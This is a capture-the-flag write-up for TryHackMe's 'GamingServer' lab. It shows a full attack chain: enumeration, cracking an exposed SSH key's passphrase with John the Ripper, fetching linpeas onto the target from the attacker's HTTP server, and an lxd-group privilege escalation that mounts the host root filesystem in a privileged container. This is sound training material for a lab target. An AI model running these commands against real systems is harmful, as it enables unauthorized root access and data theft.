# GamingServer
**Date:** January 30th 2022

**Author:** j.info

**Link:** [**GamingServer**](https://tryhackme.com/room/gamingserver) CTF on TryHackMe.

**TryHackMe Difficulty Rating:** Easy

<br>

## Objectives
- user flag
- root flag

<br>

## Initial Enumeration

### Nmap Scan

Starting out with an nmap scan to see what we have:
```
sudo nmap -sC -sV -oN gamingserver.txt 10.10.157.225
```

We only see ssh and http open:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<br>

### Gobuster Scan

Since we have an open http port let's see what we can find with a gobuster scan:
```
gobuster dir -u http://10.10.157.225 -t 50 -r -w dir-med.txt
```

It found an uploads folder and a secret folder, and both have a status of 200 so we should be able to access them.
```
/uploads              (Status: 200) [Size: 1341]
/secret               (Status: 200) [Size: 941]
```

<br>

## Website Digging

Heading over to website:

![](images/gamingserver1.png)

Viewing the source of the page reveals a comment at the bottom with a potential username:

![](images/gamingserver2.png)

Checking out the /uploads directory shows us the following files:
```
dict.lst	2020-02-05 14:10 	2.0K
manifesto.txt	2020-02-05 13:05 	3.0K
meme.jpg	2020-02-05 13:32 	15k
```

The **meme.jpg** picture ends up being Beaker from the muppets. Running it through steganography tools doesn't give us anything. meme indeed.

![](images/gamingserver3.png)

The **manifesto.txt** file is a copy of the famous [**Hacker Manifesto**](http://phrack.org/issues/7/3.html) written by a member of The Legion of Doom hacker group named The Mentor back in 1986. It's a quick read, take a look.

And **dict.lst** is a dictionary list that we can use to potentially crack passwords for users we come across on this CTF.

Let's take a look at the /secret we found during the gobuster scan:
```
secretKey	2020-02-05 13:41 	1.7K	 
```

A single file exists, and opening it up reveals a private ssh key:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
```

<br>

## Connecting to the server

I save the private key to a file on my system and then try to ssh in with the username john that was in the view source comment. `ssh -i id_rsa john@10.10.157.225`:
```
Enter passphrase for key 'id_rsa':
```

No luck, we'll have to crack the passphrase. I run `ssh2john.py id_rsa > crackthis` to convert the ssh key to a format compatible with John the Ripper. I then run `john crackthis --wordlist=dict.lst` using the provided dictionary file and it cracks in a matter of seconds:
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>          (id_rsa)     
1g 0:00:00:00 DONE (2022-01-31 01:20) 100.0g/s 22200p/s 22200c/s 22200C/s 2003..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now lets try and ssh back over:
```
ssh -i id_rsa john@10.10.157.225
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 31 03:36:37 UTC 2022

  System load:  0.0               Processes:           98
  Usage of /:   41.3% of 9.78GB   Users logged in:     0
  Memory usage: 20%               IP address for eth0: 10.10.157.225
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$
```

We're in! User flag here we come:
```
john@exploitable:~$ pwd
/home/john
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
<REDACTED>
```

One flag down, one to go.

<br>

## Server Digging

The first thing I usually check is the /etc/passwd file to see what users are on the system and in this case it's just root and John.

Checking out the `id` command to see which groups John is a member of:
```
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

He's a member of sudo, but we don't have his password yet and can't see what he's allowed to do. Running `sudo -l`:
```
[sudo] password for john: 
```

Maybe there is a quick privilege escalation using a SUID file? I run `find / -type f -perm /4000 2> /dev/null` but nothing interesting comes back.

Time to run a linpeas scan and see what we can find. I start up a http server on my system with `python3 -m http.server 80` and then download the file on the target system by running `wget http://<MY IP>/linpeas.sh`:
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.157.225 - - [30/Jan/2022 22:50:25] "GET /linpeas.sh HTTP/1.1" 200 -
```

I make linpeas.sh executable via `chmod +x linpeas.sh` and run it. The only thing that comes back as interesting is the fact that lxd is running on the system, and we're a member of the group. Given that lxd was listed in the tags for this CTF this seems like a good bet to explore further.

<br>

## Privilege Escalation via Lxd

Not having exploited lxd before I do some google searching and eventually boil it down to:
- Getting an alpine container built
- Transferring it to the target system and setting it up
- Breaking out of it as root

You won't be able to build this directly on the system due to network connectivity so on my home system I download an alpine container builder that I found on GitHub by running: `git clone https://github.com/saghul/lxd-alpine-builder.git`:
```
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
Receiving objects: 100% (50/50), 3.11 MiB | 16.51 MiB/s, done.
Resolving deltas: 100% (15/15), done.
```

Change to the created directory: `cd lxd-alpine-builder`.

Build the container with the provided `build-alpine` command: `sudo ./build-alpine`

When it's finished building you'll end up with a file similar to this:
```
alpine-v3.15-x86_64-20220131_0021.tar.gz
```

I start up a http server on my system and wget the container onto the target system.

Once it's there I run the following commands to get the container ready to go:
- `lxc image import ./alpine-v3.15-x86_64-20220131_0021.tar.gz --alias exploit`
- `lxc init exploit ignite -c security.privileged=true`
- `lxc config device add ignite exploit disk source=/ path=/mnt/root recursive=true`
- `lxc start ignite`
- `lxc list`
```
john@exploitable:/tmp$ lxc image import ./alpine-v3.15-x86_64-20220131_0021.tar.gz --alias exploit
Image imported with fingerprint: b8a65292cb8940967279eb890c67fbc9dfebb9e77a386772e74b57730b3e6fe9
john@exploitable:/tmp$ lxc init exploit ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite exploit disk source=/ path=/mnt/root recursive=true
Device exploit added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc list
+--------+---------+----------------------+-----------------------------------------------+------------+-----------+
|  NAME  |  STATE  |         IPV4         |                     IPV6                      |    TYPE    | SNAPSHOTS |
+--------+---------+----------------------+-----------------------------------------------+------------+-----------+
| ignite | RUNNING | 10.229.116.13 (eth0) | fd42:2998:1e63:3d6f:216:3eff:fe19:51ae (eth0) | PERSISTENT | 0         |
+--------+---------+----------------------+-----------------------------------------------+------------+-----------+
```

It's imported and in a running state so it looks like we're set to escalate.

Running `lxc exec ignite /bin/sh`:
```
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # whoami
root
```

We mounted to **/mnt/root** in the 3rd command above so I change over to the /root directory inside the mount and find the root.txt flag waiting:
```
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
<REDACTED>
```

With that we've solved this CTF!

![](images/gamingserver4.png)

<br>

## Conclusion

A quick run down of what we covered in this CTF:
- Basic enumeration using nmap and gobuster
- Using ssh2john to convert the format of a RSA key
- Using John the Ripper to crack the convered RSA key
- Using ssh to connect to another system
- Checking for standard privilege escalation paths
- Transfering files between systems using a HTTP server on your system
- Scanning with linPEAS
- Building an alpine lxd container
- Importing an alpine lxd container
- Using an alpine lxd container to escalate privileges

<br>

Many thanks to:
- [**SuitGuy**](https://tryhackme.com/p/SuitGuy) for creating this CTF.
- **TryHackMe** for hosting this CTF.

You can visit them at: [**https://tryhackme.com**](https://tryhackme.com)
